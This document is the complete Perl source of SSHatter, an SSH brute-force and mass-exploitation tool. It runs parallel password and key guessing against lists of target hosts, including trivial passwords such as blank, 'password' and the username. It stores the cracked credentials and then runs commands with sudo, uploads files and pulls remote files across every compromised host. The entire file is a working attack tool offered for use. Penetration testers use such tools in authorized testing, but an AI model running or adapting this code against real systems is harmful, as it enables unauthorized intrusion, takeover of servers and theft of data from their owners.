#!/usr/bin/perl -w
# $Header: /var/lib/cvsd/var/lib/cvsd/SSHatter/src/SSHatter.pl,v 1.2 2012-10-30 17:02:41 timb Exp $
#
# Redistribution and use in source and binary forms, with or without
# modification, are permitted provided that the following conditions are met:
#
# * Redistributions of source code must retain the above copyright notice, this
# list of conditions and the following disclaimer.
# * Redistributions in binary form must reproduce the above copyright notice,
# this list of conditions and the following disclaimer in the documentation
# and/or other materials provided with the distribution.
# * Neither the name of the Nth Dimension nor the names of its contributors may
# be used to endorse or promote products derived from this software without
# specific prior written permission.
#
# THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
# AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
# IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
# ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR CONTRIBUTORS BE
# LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR
# CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
# SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
# INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN
# CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)
# ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
# POSSIBILITY OF SUCH DAMAGE.
#
# (c) Tim Brown, 2010
# <mailto:timb@nth-dimension.org.uk>
# <http://www.nth-dimension.org.uk/> / <http://www.machine.org.uk/>

use strict;

package SSHatter::SSH::Host;

use Net::SSH::Perl;

sub new {
	my $class;
	my $self;
	$class = shift;
	$self = {};
	bless($self, $class);
	$self->{'hostname'} = shift;
	$self->{'portnumber'} = shift;
	return $self;
}

sub info {
	my $self;
	$self = shift;
	return $self->{'hostname'}  . ":" . $self->{'portnumber'};
}

sub pipe {
	my $self;
	$self = shift;
	pipe($self->{'readhandle'}, $self->{'writehandle'});
}

sub checkbykey {
	my $self;
	my $username;
	my $key;
	my $sshhandle;
	$self = shift;
	$username = shift;
	$key = shift;
	eval {
		$sshhandle = Net::SSH::Perl->new($self->{'hostname'}, port => $self->{'portnumber'}, identity_files => [$key], options => ["PasswordAuthentication no"]);
	};
	if ($@ ne "") {
		die "SSHatter::Exception::Host::Check::Net::SSH::Perl::New";
	} else {
		eval {
			$sshhandle->login($username);
			$sshhandle->cmd("echo SSHatter");
		};
		if ($@ ne "") {
			if ($@ !~ /Permission denied|Connection closed by remote host/) {
				die "SSHatter::Exception::Host::Check::Net::SSH::Perl::Cmd";
			} else {
				return 0;
			}
		}
	}
	return 1;
}

sub checkbypassword {
	my $self;
	my $username;
	my $password;
	my $sshhandle;
	$self = shift;
	$username = shift;
	$password = shift;
	eval {
		$sshhandle = Net::SSH::Perl->new($self->{'hostname'}, port => $self->{'portnumber'});
	};
	if ($@ ne "") {
		die "SSHatter::Exception::Host::Check::Net::SSH::Perl::New";
	} else {
		eval {
			$sshhandle->login($username, $password);
			$sshhandle->cmd("echo SSHatter");
		};
		if ($@ ne "") {
			if ($@ !~ /Permission denied|Connection closed by remote host/) {
				die "SSHatter::Exception::Host::Check::Net::SSH::Perl::Cmd";
			} else {
				return 0;
			}
		}
	}
	return 1;
}

sub writehandle {
	my $self;
	$self = shift;
	return $self->{'writehandle'};
}

sub readhandle {
	my $self;
	$self = shift;
	return $self->{'readhandle'};
}

sub unpipe {
	my $self;
	$self = shift;
	close($self->{'writehandle'});
}

sub parsecredentials {
	my $self;
	my $credentialsstring;
	my $verboseflag;
	my $credentialtype;
	my $username;
	my $credentialstring;
	$self = shift;
	$credentialsstring = shift;
	$verboseflag = shift;
	$credentialsstring =~ s/\x0a//g;
	($credentialtype, $username, $credentialstring) = split(/	/, $credentialsstring);
	if ($credentialtype eq "K") {
		$self->addkey($username, $credentialstring);
		defined($verboseflag) && print STDERR $username . ":" . $self->key($username) . "@" . $self->info() . "\n";
	} else {
		if ($credentialtype eq "P") {
			$self->addpassword($username, $credentialstring);
			defined($verboseflag) && print STDERR $username . ":" . $self->password($username) . "@" . $self->info() . "\n";
		}
	}
}

sub addkey {
	my $self;
	my $username;
	my $key;
	$self = shift;
	$username = shift;
	$key = shift;
	$self->{'keys'}{$username} = $key;
}

sub addpassword {
	my $self;
	my $username;
	my $password;
	$self = shift;
	$username = shift;
	$password = shift;
	$self->{'passwords'}{$username} = $password;
}

sub usernamesbykey {
	my $self;
	$self = shift;
	return keys(%{$self->{'keys'}});
}

sub usernamesbypassword {
	my $self;
	$self = shift;
	return keys(%{$self->{'passwords'}});
}

sub key {
	my $self;
	my $username;
	$self = shift;
	$username = shift;
	return $self->{'keys'}{$username};
}

sub password {
	my $self;
	my $username;
	$self = shift;
	$username = shift;
	return $self->{'passwords'}{$username};
}

sub executebykey {
	my $self;
	my $username;
	my $commandstring;
	my $sshhandle;
	my @resultstrings;
	$self = shift;
	$username = shift;
	$commandstring = shift;
	eval {
		$sshhandle = Net::SSH::Perl->new($self->{'hostname'}, port => $self->{'portnumber'}, identity_files => [$self->{'keys'}{$username}], options => ["PasswordAuthentication no"]);
	};
	if ($@ ne "") {
		die "SSHatter::Exception::Host::Check::Net::SSH::Perl::New";
	} else {
		eval {
			print "[" . $username . ":" . $self->{'keys'}{$username} . "@" . $self->info() . "]\$ " . $commandstring . "\n";
			$sshhandle->login($username);
			@resultstrings = $sshhandle->cmd($commandstring);
		};
		if ($@ ne "") {
			if ($@ !~ /Permission denied|Connection closed by remote host/) {
				die "SSHatter::Exception::Host::Check::Net::SSH::Perl::Cmd";
			} else {
				return ("", "", -42);
			}
		}
	}
	return @resultstrings;
}

sub executebypassword {
	my $self;
	my $username;
	my $sudoflag;
	my $commandstring;
	my $sshhandle;
	my @resultstrings;
	$self = shift;
	$username = shift;
	$sudoflag = shift;
	$commandstring = shift;
	eval {
		$sshhandle = Net::SSH::Perl->new($self->{'hostname'}, port => $self->{'portnumber'});
	};
	if ($@ ne "") {
		die "SSHatter::Exception::Host::Check::Net::SSH::Perl::New";
	} else {
		eval {
			$sshhandle->login($username, $self->{'passwords'}{$username});
			print "[" . $username . ":" . $self->{'passwords'}{$username} . "@" . $self->info() . "]\$ " . $commandstring . "\n";
			if (defined($sudoflag)) {
				@resultstrings = $sshhandle->cmd($commandstring, $self->{'passwords'}{$username} . "\n");
			} else {
				@resultstrings = $sshhandle->cmd($commandstring);
			}
		};
		if ($@ ne "") {
			if ($@ !~ /Permission denied|Connection closed by remote host/) {
				die "SSHatter::Exception::Host::Check::Net::SSH::Perl::Cmd";
			} else {
				return ("", "", -42);
			}
		}
	}
	return @resultstrings;
}

package SSHatter;

use File::Basename;
use Getopt::Std;
use Parallel::ForkManager;

my %argumentslist;
my $verboseflag;
my $importfilename;
my $maximumprocess;
my $targetserverfilename;
my $usernamefilename;
my $keydirectoryname;
my $passwordfilename;
my $dumbflag;
my $exportfilename;
my $sudoflag;
my $safeflag;
my $masscommand;
my $interactiveflag;
my $localfilename;
my $remotefilename;
my $importhandle;
my $importdata;
my $targetserverhandle;
my $targetserverstring;
my $hostname;
my $portnumber;
my $forkmanager;
my $targetserver;
my $processid;
my $writehandle;
my $usernamehandle;
my $usernamestring;
my $keyfilename;
my $passwordhandle;
my $passwordstring;
my @targetservers;
my $exportfilehandle;
my $confirmresponse;
my @resultstrings;
my $nextcommand;
my $localfilehandle;
my $localfilebyte;
my $localfiledata;

sub parsetarget {
	my $targetserverstring;
	my $hostname;
	my $portnumber;
	$targetserverstring = shift;
	$targetserverstring =~ s/\x0a//g;
	($hostname, $portnumber) = split(/:/, $targetserverstring);
	if ($portnumber && ($portnumber =~ /([0-9]+)/)) {
		$portnumber = $1;
		if (($portnumber <= 0) || ($portnumber > 65535)) {
			$portnumber = 22;
		}
	} else {
		$portnumber = 22;
	}
	return ($hostname, $portnumber);
}

sub main::HELP_MESSAGE {
	die "usage: " . basename($0) . " [-v] <-I <importfilename>> | <-x <maximumprocess> -t <targetserverfilename> -u <usernamefilename> <[-k <keydirectoryname>] [-p <passwordfilename>] [-d] [-X <outputfilename>]>> [[-0] [-s] -m <masscommand> | [-0] [-s] -i | -P <localfilename> | -G <remotefilename>]

	-v - verbose mode, toggles realtime updates on STDERR
	-d - dumb mode, try username equals password, username, blank
	-0 - sudo mode, echo the password to STDIN (useful for systems where sudo -S works)
	-s - safe mode, prompt before executing
	-m - mass mode, run one command across all targets
	-i - interactive mode, run multiple commands across all targets (non-persistant)
	-P - upload a file
	-G - download a file

If sudo mode is not enabled, then " . $0 . " will block on STDIN.";
}

sub main::VERSION_MESSAGE {
	print basename($0) . " 1.1\n";
}

$Getopt::Std::STANDARD_HELP_VERSION = 1;
getopts("vI:x:t:u:k:p:dX:0sm:iP:G:", \%argumentslist);
if (defined($argumentslist{'v'})) {
	$verboseflag = 1;
}
if (defined($argumentslist{'I'})) {
	if (-e $argumentslist{'I'}) {
		$importfilename = $argumentslist{'I'};
	} else {
		Getopt::Std::help_mess("", "main");
	}
} else {
	if (defined($argumentslist{'x'}) && ($argumentslist{'x'} =~ /([0-9]+)/)) {
		$maximumprocess = $1;
	} else {
		Getopt::Std::help_mess("", "main");
	}
	if (defined($argumentslist{'t'}) && (-e $argumentslist{'t'})) {
		$targetserverfilename = $argumentslist{'t'};
	} else {
		Getopt::Std::help_mess("", "main");
	}
	if (defined($argumentslist{'u'}) && (-e $argumentslist{'u'})) {
		$usernamefilename = $argumentslist{'u'};
	} else {
		Getopt::Std::help_mess("", "main");
	}
	if (defined($argumentslist{'k'}) && (-e $argumentslist{'k'})) {
		$keydirectoryname = $argumentslist{'k'};
	}
	if (defined($argumentslist{'p'}) && (-e $argumentslist{'p'})) {
		$passwordfilename = $argumentslist{'p'};
	}
	if (defined($argumentslist{'d'})) {
		$dumbflag = 1;
	}
	if (!defined($keydirectoryname) && !defined($passwordfilename) && !defined($dumbflag)) {
		Getopt::Std::help_mess("", "main");
	}
}
if (defined($argumentslist{'X'})) {
	$exportfilename = $argumentslist{'X'};
}
if (defined($argumentslist{'0'})) {
	$sudoflag = 1;
}
if (defined($argumentslist{'s'})) {
	$safeflag = 1;
}
if (defined($argumentslist{'m'})) {
	$masscommand = $argumentslist{'m'};
} else {
	if (defined($argumentslist{'i'})) {
		$interactiveflag = 1;
	} else {
		if (defined($argumentslist{'P'})) {
			if (-e $argumentslist{'P'}) {
				$localfilename = $argumentslist{'P'};
			} else {
				Getopt::Std::help_mess("", "main");
			}
		} else {
			if (defined($argumentslist{'G'})) {
				$remotefilename = $argumentslist{'G'};
			}
		}
	}
}

$forkmanager = Parallel::ForkManager->new($maximumprocess);
$forkmanager->run_on_finish(sub { 
	my $processid;
	my $returncode;
	my $targetserver;
	my $readhandle;
	my $readdata;
	$processid = shift;
	$returncode = shift;
	$targetserver = shift;
	$targetserver->unpipe();
	$readhandle = $targetserver->readhandle();
	while ($readdata = <$readhandle>) {
		$targetserver->parsecredentials($readdata, $verboseflag);
	}
	close($readhandle);
	print "I: " . $targetserver->info() . " finished\n";
});
if (defined($importfilename)) {
	open($importhandle, "<" . $importfilename);
	while ($importdata = <$importhandle>) {
		if ($importdata =~ /^target	(.*)/) {
			($hostname, $portnumber) = parsetarget($1);
			$targetserver = SSHatter::SSH::Host->new($hostname, $portnumber);
			push(@targetservers, $targetserver);
		} else {
			if (defined($targetserver)) {
				$targetserver->parsecredentials($importdata, $verboseflag);
			} else {
				die "SSHatter::Exception::Import";
			}
		}
	}
	close($importhandle);
} else {
	open($targetserverhandle, "<" . $targetserverfilename);
	while ($targetserverstring = <$targetserverhandle>) {
		($hostname, $portnumber) = parsetarget($targetserverstring);
		$targetserver = SSHatter::SSH::Host->new($hostname, $portnumber);
		push(@targetservers, $targetserver);
		$targetserver->pipe();
		$processid = $forkmanager->start($targetserver) and next;
		print "I: " . $targetserver->info() . "\n";
		$writehandle = $targetserver->writehandle();
		open($usernamehandle, "<" . $usernamefilename);
		while ($usernamestring = <$usernamehandle>) {
			$usernamestring =~ s/\x0a//g;
			if (defined($keydirectoryname)) {
				while ($keyfilename = <$keydirectoryname/*>) {
					if ($targetserver->checkbykey($usernamestring, $keyfilename) == 1) {
						print $writehandle "K" . "	" . $usernamestring . "	" . $keyfilename . "\n";
					}
				}
			}
			if (defined($passwordfilename)) {
				open($passwordhandle, "<" . $passwordfilename);
				while ($passwordstring = <$passwordhandle>) {
					$passwordstring =~ s/\x0a//g;
					if ($targetserver->checkbypassword($usernamestring, $passwordstring) == 1) {
						print $writehandle "P" . "	" . $usernamestring . "	" . $passwordstring . "\n";
					}
				}
				close($passwordhandle);
			}
			if (defined($dumbflag)) {
				foreach $passwordstring (("", "password", $usernamestring)) {
					if ($targetserver->checkbypassword($usernamestring, $passwordstring) == 1) {
						print $writehandle "P" . "	" . $usernamestring . "	" . $passwordstring . "\n";
					}
				}
			}
		}
		close($usernamehandle);
		$forkmanager->finish();
	}
	close($targetserverhandle);
	$forkmanager->wait_all_children();
}
if (defined($exportfilename)) {
	open($exportfilehandle, ">" . $exportfilename);
	foreach $targetserver (@targetservers) {
		print $exportfilehandle "target	" . $targetserver->info() . "\n";
		foreach $usernamestring ($targetserver->usernamesbykey()) {
			print $exportfilehandle "K	" . $usernamestring . "	" . $targetserver->key($usernamestring) . "\n";
		}
		foreach $usernamestring ($targetserver->usernamesbypassword()) {
			print $exportfilehandle "P	" . $usernamestring . "	" . $targetserver->password($usernamestring) . "\n";
		}
	}
	close($exportfilehandle);
}
foreach $targetserver (@targetservers) {
	foreach $usernamestring ($targetserver->usernamesbykey()) {
		print $usernamestring . ":" . $targetserver->key($usernamestring) . "@" . $targetserver->info() . "\n";
	}
	foreach $usernamestring ($targetserver->usernamesbypassword()) {
		print $usernamestring . ":" . $targetserver->password($usernamestring) . "@" . $targetserver->info() . "\n";
	}
}
if ((defined($masscommand) || defined($interactiveflag)) && defined($safeflag)) {
	print "W: executing " . (defined($masscommand) ? $masscommand : "in interactive mode") . ", continue? [y/N] ";
	$confirmresponse = <>;
	if ($confirmresponse !~ /^[Yy]/) {
		exit(1);
	}
}
if (defined($masscommand)) {
	foreach $targetserver (@targetservers) {
		foreach $usernamestring ($targetserver->usernamesbykey()) {
			@resultstrings = $targetserver->executebykey($usernamestring, $masscommand);
			if (($resultstrings[2] != -42) && defined($resultstrings[0])) {
				print $resultstrings[0];
			}
		}
		foreach $usernamestring ($targetserver->usernamesbypassword()) {
			@resultstrings = $targetserver->executebypassword($usernamestring, $sudoflag, $masscommand);
			if (($resultstrings[2] != -42) && defined($resultstrings[0])) {
				print $resultstrings[0];
			}
		}
	}
} else {
	if (defined($interactiveflag)) {
		print "\$ ";
		while ($nextcommand = <>) {
			$nextcommand =~ s/\x0a//g;
			if ($nextcommand eq "exit") {
				last;
			} else {
				if ($nextcommand =~ /put (.*)/) {
					open($localfilehandle, "<" . $1);
					binmode($localfilehandle);
					while (read($localfilehandle, $localfilebyte, 1) != 0) {
						$localfiledata .= sprintf("\\x%02x", ord($localfilebyte));
					}
					close($localfilehandle);
					foreach $targetserver (@targetservers) {
						foreach $usernamestring ($targetserver->usernamesbykey()) {
							@resultstrings = $targetserver->executebykey($usernamestring, "printf \"" . $localfiledata . "\" >> " . basename($1));
							if (($resultstrings[2] != -42) && defined($resultstrings[0])) {
								print $resultstrings[0];
							}
						}
						foreach $usernamestring ($targetserver->usernamesbypassword()) {
							@resultstrings = $targetserver->executebypassword($usernamestring, 0, "printf \"" . $localfiledata . "\" >> " . basename($1));
							if (($resultstrings[2] != -42) && defined($resultstrings[0])) {
								print $resultstrings[0];
							}
						}
					}
				} else {
					if ($nextcommand =~ /get (.*)/) {
						foreach $targetserver (@targetservers) {
							foreach $usernamestring ($targetserver->usernamesbykey()) {
								@resultstrings = $targetserver->executebykey($usernamestring, "cat " . $1);
								if (($resultstrings[2] != -42) && defined($resultstrings[0])) {
									open($localfilehandle, ">" . $usernamestring . "@" . $targetserver->info() . "-" . basename($1));
									print $localfilehandle $resultstrings[0];
									close($localfilehandle);
								}
							}
							foreach $usernamestring ($targetserver->usernamesbypassword()) {
								@resultstrings = $targetserver->executebypassword($usernamestring, 0, "cat " . $1);
								if (($resultstrings[2] != -42) && defined($resultstrings[0])) {
									open($localfilehandle, ">" . $usernamestring . "@" . $targetserver->info() . "-" . basename($1));
									print $localfilehandle $resultstrings[0];
									close($localfilehandle);
								}
							}
						}
					} else {
						foreach $targetserver (@targetservers) {
							foreach $usernamestring ($targetserver->usernamesbykey()) {
								@resultstrings = $targetserver->executebykey($usernamestring, $nextcommand);
								if (($resultstrings[2] != -42) && defined($resultstrings[0])) {
									print $resultstrings[0];
								}
							}
							foreach $usernamestring ($targetserver->usernamesbypassword()) {
								@resultstrings = $targetserver->executebypassword($usernamestring, $sudoflag, $nextcommand);
								if (($resultstrings[2] != -42) && defined($resultstrings[0])) {
									print $resultstrings[0];
								}
							}
						}
					}
				}
			}
			print "\$ ";
		}
	} else {
		if (defined($localfilename)) {
			open($localfilehandle, "<" . $localfilename);
			binmode($localfilehandle);
			while (read($localfilehandle, $localfilebyte, 1) != 0) {
				$localfiledata .= sprintf("\\x%02x", ord($localfilebyte));
			}
			close($localfilehandle);
			foreach $targetserver (@targetservers) {
				foreach $usernamestring ($targetserver->usernamesbykey()) {
					@resultstrings = $targetserver->executebykey($usernamestring, "printf \"" . $localfiledata . "\" >> " . basename($localfilename));
					if (($resultstrings[2] != -42) && defined($resultstrings[0])) {
						print $resultstrings[0];
					}
				}
				foreach $usernamestring ($targetserver->usernamesbypassword()) {
					@resultstrings = $targetserver->executebypassword($usernamestring, 0, "printf \"" . $localfiledata . "\" >> " . basename($localfilename));
					if (($resultstrings[2] != -42) && defined($resultstrings[0])) {
						print $resultstrings[0];
					}
				}
			}
		} else {
			if (defined($remotefilename)) {
				foreach $targetserver (@targetservers) {
					foreach $usernamestring ($targetserver->usernamesbykey()) {
						@resultstrings = $targetserver->executebykey($usernamestring, "cat " . $remotefilename);
						if (($resultstrings[2] != -42) && defined($resultstrings[0])) {
							open($localfilehandle, ">" . $usernamestring . "@" . $targetserver->info() . "-" . basename($remotefilename));
							print $localfilehandle $resultstrings[0];
							close($localfilehandle);
						}
					}
					foreach $usernamestring ($targetserver->usernamesbypassword()) {
						@resultstrings = $targetserver->executebypassword($usernamestring, 0, "cat " . $remotefilename);
						if (($resultstrings[2] != -42) && defined($resultstrings[0])) {
							open($localfilehandle, ">" . $usernamestring . "@" . $targetserver->info() . "-" . basename($remotefilename));
							print $localfilehandle $resultstrings[0];
							close($localfilehandle);
						}
					}
				}
			}
		}
	}
}
exit(1);
